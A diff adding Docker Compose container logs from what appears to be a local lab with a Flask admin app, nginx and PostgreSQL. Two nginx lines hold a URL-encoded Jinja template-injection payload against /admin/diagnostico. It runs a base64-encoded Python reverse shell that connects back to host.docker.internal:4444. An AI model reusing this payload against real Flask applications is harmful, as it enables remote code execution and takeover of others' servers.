@@ -1,0 +1,208 @@
+webapp-1  | 2026-06-09T06:02:34.333007383Z  * Serving Flask app 'app'
+webapp-1  | 2026-06-09T06:02:34.333083261Z  * Debug mode: off
+webapp-1  | 2026-06-09T06:02:34.337788892Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+webapp-1  | 2026-06-09T06:02:34.337820042Z  * Running on all addresses (0.0.0.0)
+webapp-1  | 2026-06-09T06:02:34.337824852Z  * Running on http://127.0.0.1:5000
+webapp-1  | 2026-06-09T06:02:34.337828589Z  * Running on http://172.18.0.3:5000
+webapp-1  | 2026-06-09T06:02:34.337832166Z [33mPress CTRL+C to quit[0m
+webapp-1   | 2026-06-09T06:03:48.726213780Z 172.20.0.3 - - [09/Jun/2026 08:03:48] "[32mGET /admin HTTP/1.1[0m" 302 -
+webapp-1   | 2026-06-09T06:03:48.791029616Z 172.20.0.3 - - [09/Jun/2026 08:03:48] "GET /admin/dashboard HTTP/1.1" 200 -
+webapp-1   | 2026-06-09T06:03:53.974504129Z 172.20.0.3 - - [09/Jun/2026 08:03:53] "GET /admin/diagnostico HTTP/1.1" 200 -
+db-1      | 2026-06-09T06:02:27.170685997Z The files belonging to this database system will be owned by user "postgres".
+db-1       | 2026-06-09T06:02:27.170746395Z This user must also own the server process.
+db-1       | 2026-06-09T06:02:27.170751615Z 
+db-1       | 2026-06-09T06:02:27.170976033Z The database cluster will be initialized with locale "en_US.utf8".
+db-1       | 2026-06-09T06:02:27.170988747Z The default database encoding has accordingly been set to "UTF8".
+db-1       | 2026-06-09T06:02:27.170996102Z The default text search configuration will be set to "english".
+db-1       | 2026-06-09T06:02:27.171006782Z 
+db-1       | 2026-06-09T06:02:27.171012373Z Data page checksums are disabled.
+db-1       | 2026-06-09T06:02:27.171017433Z 
+db-1       | 2026-06-09T06:02:27.171222543Z fixing permissions on existing directory /var/lib/postgresql/data ... ok
+db-1       | 2026-06-09T06:02:27.186130978Z creating subdirectories ... ok
+db-1       | 2026-06-09T06:02:27.186196321Z selecting dynamic shared memory implementation ... posix
+nginx-1    | 2026-06-09T06:02:34.239162082Z /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
+nginx-1    | 2026-06-09T06:02:34.239230686Z /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
+nginx-1    | 2026-06-09T06:02:34.241736920Z /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
+nginx-1    | 2026-06-09T06:02:34.259151128Z 10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
+nginx-1    | 2026-06-09T06:02:34.289914283Z 10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf
+nginx-1    | 2026-06-09T06:02:34.290430731Z /docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
+nginx-1    | 2026-06-09T06:02:34.290772147Z /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
+nginx-1    | 2026-06-09T06:02:34.299321636Z /docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
+nginx-1    | 2026-06-09T06:02:34.303821014Z /docker-entrypoint.sh: Configuration complete; ready for start up
+nginx-1    | 2026-06-09T06:03:48.729267633Z 172.20.0.1 - - [09/Jun/2026:06:03:48 +0000] "GET /admin HTTP/1.1" 302 219 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
+nginx-1    | 2026-06-09T06:03:48.791849114Z 172.20.0.1 - - [09/Jun/2026:06:03:48 +0000] "GET /admin/dashboard HTTP/1.1" 200 5148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
+nginx-1    | 2026-06-09T06:03:53.976050212Z 172.20.0.1 - - [09/Jun/2026:06:03:53 +0000] "GET /admin/diagnostico HTTP/1.1" 200 3556 "http://localhost:8080/admin/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
+db-1       | 2026-06-09T06:02:27.220422244Z selecting default max_connections ... 100
+db-1       | 2026-06-09T06:02:27.271504896Z selecting default shared_buffers ... 128MB
+db-1       | 2026-06-09T06:02:27.386126656Z selecting default time zone ... UTC
+db-1       | 2026-06-09T06:02:27.390896717Z creating configuration files ... ok
+db-1       | 2026-06-09T06:02:27.731494543Z running bootstrap script ... ok
+db-1       | 2026-06-09T06:02:28.219046384Z sh: locale: not found
+db-1       | 2026-06-09T06:02:28.219538690Z 2026-06-09 06:02:28.219 UTC [35] WARNING:  no usable system locales were found
+db-1       | 2026-06-09T06:02:29.221508790Z performing post-bootstrap initialization ... ok
+db-1       | 2026-06-09T06:02:31.133910667Z initdb: warning: enabling "trust" authentication for local connections
+db-1       | 2026-06-09T06:02:31.133963650Z initdb: hint: You can change this by editing pg_hba.conf or using the option -A, or --auth-local and --auth-host, the next time you run initdb.
+db-1       | 2026-06-09T06:02:31.134047298Z syncing data to disk ... ok
+db-1       | 2026-06-09T06:02:31.134157052Z 
+db-1       | 2026-06-09T06:02:31.134168244Z 
+db-1       | 2026-06-09T06:02:31.134179385Z Success. You can now start the database server using:
+db-1       | 2026-06-09T06:02:31.134187080Z 
+db-1       | 2026-06-09T06:02:31.134192731Z     pg_ctl -D /var/lib/postgresql/data -l logfile start
+db-1       | 2026-06-09T06:02:31.134198042Z 
+db-1       | 2026-06-09T06:02:31.233268748Z waiting for server to start....2026-06-09 06:02:31.232 UTC [41] LOG:  starting PostgreSQL 15.18 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
+db-1       | 2026-06-09T06:02:31.240205809Z 2026-06-09 06:02:31.239 UTC [41] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+db-1       | 2026-06-09T06:02:31.262623362Z 2026-06-09 06:02:31.262 UTC [44] LOG:  database system was shut down at 2026-06-09 06:02:29 UTC
+db-1       | 2026-06-09T06:02:31.276408863Z 2026-06-09 06:02:31.276 UTC [41] LOG:  database system is ready to accept connections
+db-1       | 2026-06-09T06:02:31.280462597Z  done
+db-1       | 2026-06-09T06:02:31.280490161Z server started
+db-1       | 2026-06-09T06:02:31.445170245Z CREATE DATABASE
+db-1       | 2026-06-09T06:02:31.446630322Z 
+db-1       | 2026-06-09T06:02:31.446860331Z 
+db-1       | 2026-06-09T06:02:31.446872404Z /usr/local/bin/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/init.sql
+db-1       | 2026-06-09T06:02:31.507708200Z CREATE TABLE
+db-1       | 2026-06-09T06:02:31.513283821Z INSERT 0 3
+db-1       | 2026-06-09T06:02:31.515140472Z 
+db-1       | 2026-06-09T06:02:31.515152856Z 
+db-1       | 2026-06-09T06:02:31.516826590Z waiting for server to shut down....2026-06-09 06:02:31.516 UTC [41] LOG:  received fast shutdown request
+db-1       | 2026-06-09T06:02:31.523531028Z 2026-06-09 06:02:31.522 UTC [41] LOG:  aborting any active transactions
+db-1       | 2026-06-09T06:02:31.528311795Z 2026-06-09 06:02:31.527 UTC [41] LOG:  background worker "logical replication launcher" (PID 47) exited with exit code 1
+db-1       | 2026-06-09T06:02:31.528620417Z 2026-06-09 06:02:31.528 UTC [42] LOG:  shutting down
+db-1       | 2026-06-09T06:02:31.535436678Z 2026-06-09 06:02:31.535 UTC [42] LOG:  checkpoint starting: shutdown immediate
+db-1       | 2026-06-09T06:02:32.031808284Z 2026-06-09 06:02:32.031 UTC [42] LOG:  checkpoint complete: wrote 930 buffers (5.7%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.055 s, sync=0.418 s, total=0.503 s; sync files=304, longest=0.006 s, average=0.002 s; distance=4254 kB, estimate=4254 kB
+db-1       | 2026-06-09T06:02:32.056267205Z 2026-06-09 06:02:32.055 UTC [41] LOG:  database system is shut down
+db-1       | 2026-06-09T06:02:32.119775337Z  done
+db-1       | 2026-06-09T06:02:32.119823461Z server stopped
+db-1       | 2026-06-09T06:02:32.122520839Z 
+db-1       | 2026-06-09T06:02:32.122541389Z PostgreSQL init process complete; ready for start up.
+db-1       | 2026-06-09T06:02:32.122550537Z 
+db-1       | 2026-06-09T06:02:32.201870816Z 2026-06-09 06:02:32.201 UTC [1] LOG:  starting PostgreSQL 15.18 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
+db-1       | 2026-06-09T06:02:32.203308211Z 2026-06-09 06:02:32.202 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+db-1       | 2026-06-09T06:02:32.203330134Z 2026-06-09 06:02:32.203 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+db-1       | 2026-06-09T06:02:32.219469023Z 2026-06-09 06:02:32.219 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+db-1       | 2026-06-09T06:02:32.238984817Z 2026-06-09 06:02:32.238 UTC [59] LOG:  database system was shut down at 2026-06-09 06:02:32 UTC
+db-1       | 2026-06-09T06:02:32.256105698Z 2026-06-09 06:02:32.255 UTC [1] LOG:  database system is ready to accept connections
+db-1       | 2026-06-09T06:07:32.265966760Z 2026-06-09 06:07:32.260 UTC [57] LOG:  checkpoint starting: time
+db-1       | 2026-06-09T06:07:34.379770826Z 2026-06-09 06:07:34.379 UTC [57] LOG:  checkpoint complete: wrote 21 buffers (0.1%); 0 WAL file(s) added, 0 removed, 0 recycled; write=2.003 s, sync=0.035 s, total=2.121 s; sync files=10, longest=0.012 s, average=0.004 s; distance=36 kB, estimate=36 kB
+backend-1  | 2026-06-09T06:02:27.965418698Z  * Serving Flask app 'app'
+backend-1  | 2026-06-09T06:02:27.965545866Z  * Debug mode: off
+backend-1  | 2026-06-09T06:02:27.970262443Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+backend-1  | 2026-06-09T06:02:27.970296139Z  * Running on http://127.0.0.1:5000
+nginx-1    | 2026-06-09T06:04:57.980774206Z 2026/06/09 06:04:57 [error] 30#30: *2 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 172.20.0.1, server: , request: "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1", upstream: "http://172.20.0.2:5000/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D", host: "localhost:8080", referrer: "http://localhost:8080/admin/diagnostico"
+nginx-1    | 2026-06-09T06:04:57.981004895Z 172.20.0.1 - - [09/Jun/2026:06:04:57 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 504 569 "http://localhost:8080/admin/diagnostico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
+backend-1  | 2026-06-09T06:02:27.970301991Z [33mPress CTRL+C to quit[0m
+backend-1  | 2026-06-09T06:02:32.749803929Z 127.0.0.1 - - [09/Jun/2026 06:02:32] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:02:37.878177841Z 127.0.0.1 - - [09/Jun/2026 06:02:37] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:02:43.028290976Z 127.0.0.1 - - [09/Jun/2026 06:02:43] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:02:48.158242484Z 127.0.0.1 - - [09/Jun/2026 06:02:48] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:02:53.294647097Z 127.0.0.1 - - [09/Jun/2026 06:02:53] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:02:58.420345153Z 127.0.0.1 - - [09/Jun/2026 06:02:58] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:03.528522690Z 127.0.0.1 - - [09/Jun/2026 06:03:03] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:08.655317061Z 127.0.0.1 - - [09/Jun/2026 06:03:08] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:13.768028139Z 127.0.0.1 - - [09/Jun/2026 06:03:13] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:18.903083205Z 127.0.0.1 - - [09/Jun/2026 06:03:18] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:24.055845184Z 127.0.0.1 - - [09/Jun/2026 06:03:24] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:29.183405218Z 127.0.0.1 - - [09/Jun/2026 06:03:29] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:34.336574317Z 127.0.0.1 - - [09/Jun/2026 06:03:34] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:39.520725682Z 127.0.0.1 - - [09/Jun/2026 06:03:39] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:44.686729316Z 127.0.0.1 - - [09/Jun/2026 06:03:44] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:49.930886623Z 127.0.0.1 - - [09/Jun/2026 06:03:49] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:03:55.099121435Z 127.0.0.1 - - [09/Jun/2026 06:03:55] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:00.289230882Z 127.0.0.1 - - [09/Jun/2026 06:04:00] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:05.460465155Z 127.0.0.1 - - [09/Jun/2026 06:04:05] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:10.598274453Z 127.0.0.1 - - [09/Jun/2026 06:04:10] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:15.844240462Z 127.0.0.1 - - [09/Jun/2026 06:04:15] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:21.373792205Z 127.0.0.1 - - [09/Jun/2026 06:04:21] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:26.627254664Z 127.0.0.1 - - [09/Jun/2026 06:04:26] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:31.748790081Z 127.0.0.1 - - [09/Jun/2026 06:04:31] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:36.893997800Z 127.0.0.1 - - [09/Jun/2026 06:04:36] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:42.005496473Z 127.0.0.1 - - [09/Jun/2026 06:04:42] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:47.121302011Z 127.0.0.1 - - [09/Jun/2026 06:04:47] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:52.259903487Z 127.0.0.1 - - [09/Jun/2026 06:04:52] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:04:57.373184887Z 127.0.0.1 - - [09/Jun/2026 06:04:57] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:02.496981062Z 127.0.0.1 - - [09/Jun/2026 06:05:02] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:07.638229516Z 127.0.0.1 - - [09/Jun/2026 06:05:07] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:12.762798383Z 127.0.0.1 - - [09/Jun/2026 06:05:12] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:17.943684755Z 127.0.0.1 - - [09/Jun/2026 06:05:17] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:23.081247767Z 127.0.0.1 - - [09/Jun/2026 06:05:23] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:28.260034599Z 127.0.0.1 - - [09/Jun/2026 06:05:28] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:33.451964295Z 127.0.0.1 - - [09/Jun/2026 06:05:33] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:38.580281228Z 127.0.0.1 - - [09/Jun/2026 06:05:38] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:43.711782544Z 127.0.0.1 - - [09/Jun/2026 06:05:43] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:48.853044223Z 127.0.0.1 - - [09/Jun/2026 06:05:48] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:53.983512273Z 127.0.0.1 - - [09/Jun/2026 06:05:53] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:05:59.143589305Z 127.0.0.1 - - [09/Jun/2026 06:05:59] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:04.283935289Z 127.0.0.1 - - [09/Jun/2026 06:06:04] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:09.411569208Z 127.0.0.1 - - [09/Jun/2026 06:06:09] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:14.539008994Z 127.0.0.1 - - [09/Jun/2026 06:06:14] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:19.665885338Z 127.0.0.1 - - [09/Jun/2026 06:06:19] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:24.803634917Z 127.0.0.1 - - [09/Jun/2026 06:06:24] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:29.958739060Z 127.0.0.1 - - [09/Jun/2026 06:06:29] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:35.095657435Z 127.0.0.1 - - [09/Jun/2026 06:06:35] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:40.225285444Z 127.0.0.1 - - [09/Jun/2026 06:06:40] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:45.355495386Z 127.0.0.1 - - [09/Jun/2026 06:06:45] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:50.493712184Z 127.0.0.1 - - [09/Jun/2026 06:06:50] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:06:55.635016676Z 127.0.0.1 - - [09/Jun/2026 06:06:55] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:00.906657203Z 127.0.0.1 - - [09/Jun/2026 06:07:00] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:06.042364363Z 127.0.0.1 - - [09/Jun/2026 06:07:06] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:11.185527263Z 127.0.0.1 - - [09/Jun/2026 06:07:11] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:16.346860303Z 127.0.0.1 - - [09/Jun/2026 06:07:16] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:21.575280773Z 127.0.0.1 - - [09/Jun/2026 06:07:21] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:26.709768313Z 127.0.0.1 - - [09/Jun/2026 06:07:26] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:31.865802936Z 127.0.0.1 - - [09/Jun/2026 06:07:31] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:36.981112551Z 127.0.0.1 - - [09/Jun/2026 06:07:36] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:42.097284892Z 127.0.0.1 - - [09/Jun/2026 06:07:42] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:47.340010663Z 127.0.0.1 - - [09/Jun/2026 06:07:47] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:52.576672824Z 127.0.0.1 - - [09/Jun/2026 06:07:52] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:07:57.820539939Z 127.0.0.1 - - [09/Jun/2026 06:07:57] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:03.060432601Z 127.0.0.1 - - [09/Jun/2026 06:08:03] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:08.375217805Z 127.0.0.1 - - [09/Jun/2026 06:08:08] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:13.724935849Z 127.0.0.1 - - [09/Jun/2026 06:08:13] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:18.895787856Z 127.0.0.1 - - [09/Jun/2026 06:08:18] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:24.143031172Z 127.0.0.1 - - [09/Jun/2026 06:08:24] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:29.334440285Z 127.0.0.1 - - [09/Jun/2026 06:08:29] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:34.533285641Z 127.0.0.1 - - [09/Jun/2026 06:08:34] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:39.768299057Z 127.0.0.1 - - [09/Jun/2026 06:08:39] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:45.010769675Z 127.0.0.1 - - [09/Jun/2026 06:08:45] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:50.263048112Z 127.0.0.1 - - [09/Jun/2026 06:08:50] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:08:55.468253567Z 127.0.0.1 - - [09/Jun/2026 06:08:55] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:00.714469173Z 127.0.0.1 - - [09/Jun/2026 06:09:00] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:05.927638060Z 127.0.0.1 - - [09/Jun/2026 06:09:05] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:11.216439304Z 127.0.0.1 - - [09/Jun/2026 06:09:11] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:16.479734519Z 127.0.0.1 - - [09/Jun/2026 06:09:16] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:21.732310673Z 127.0.0.1 - - [09/Jun/2026 06:09:21] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:26.972281794Z 127.0.0.1 - - [09/Jun/2026 06:09:26] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:32.313336044Z 127.0.0.1 - - [09/Jun/2026 06:09:32] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:37.555834596Z 127.0.0.1 - - [09/Jun/2026 06:09:37] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:42.808879107Z 127.0.0.1 - - [09/Jun/2026 06:09:42] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:48.019694389Z 127.0.0.1 - - [09/Jun/2026 06:09:48] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:53.256006234Z 127.0.0.1 - - [09/Jun/2026 06:09:53] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:09:58.458685306Z 127.0.0.1 - - [09/Jun/2026 06:09:58] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:03.630867625Z 127.0.0.1 - - [09/Jun/2026 06:10:03] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:08.914381784Z 127.0.0.1 - - [09/Jun/2026 06:10:08] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:14.046380065Z 127.0.0.1 - - [09/Jun/2026 06:10:14] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:19.200820669Z 127.0.0.1 - - [09/Jun/2026 06:10:19] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:24.364313812Z 127.0.0.1 - - [09/Jun/2026 06:10:24] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:29.484028672Z 127.0.0.1 - - [09/Jun/2026 06:10:29] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:34.687912131Z 127.0.0.1 - - [09/Jun/2026 06:10:34] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:39.861784487Z 127.0.0.1 - - [09/Jun/2026 06:10:39] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:45.039734185Z 127.0.0.1 - - [09/Jun/2026 06:10:45] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:50.161576227Z 127.0.0.1 - - [09/Jun/2026 06:10:50] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:10:55.281269534Z 127.0.0.1 - - [09/Jun/2026 06:10:55] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:00.413921175Z 127.0.0.1 - - [09/Jun/2026 06:11:00] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:05.553176742Z 127.0.0.1 - - [09/Jun/2026 06:11:05] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:10.728116761Z 127.0.0.1 - - [09/Jun/2026 06:11:10] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:15.864196946Z 127.0.0.1 - - [09/Jun/2026 06:11:15] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:21.062731901Z 127.0.0.1 - - [09/Jun/2026 06:11:21] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:26.240488803Z 127.0.0.1 - - [09/Jun/2026 06:11:26] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:31.447599518Z 127.0.0.1 - - [09/Jun/2026 06:11:31] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:36.719367571Z 127.0.0.1 - - [09/Jun/2026 06:11:36] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:41.993965293Z 127.0.0.1 - - [09/Jun/2026 06:11:41] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:47.214345445Z 127.0.0.1 - - [09/Jun/2026 06:11:47] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:52.472769689Z 127.0.0.1 - - [09/Jun/2026 06:11:52] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:11:57.653562760Z 127.0.0.1 - - [09/Jun/2026 06:11:57] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:12:02.797051655Z 127.0.0.1 - - [09/Jun/2026 06:12:02] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:12:07.952949514Z 127.0.0.1 - - [09/Jun/2026 06:12:07] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:12:13.084252452Z 127.0.0.1 - - [09/Jun/2026 06:12:13] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:12:18.272201737Z 127.0.0.1 - - [09/Jun/2026 06:12:18] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:12:23.426707681Z 127.0.0.1 - - [09/Jun/2026 06:12:23] "GET /health HTTP/1.1" 200 -
+backend-1  | 2026-06-09T06:12:28.566918047Z 127.0.0.1 - - [09/Jun/2026 06:12:28] "GET /health HTTP/1.1" 200 -
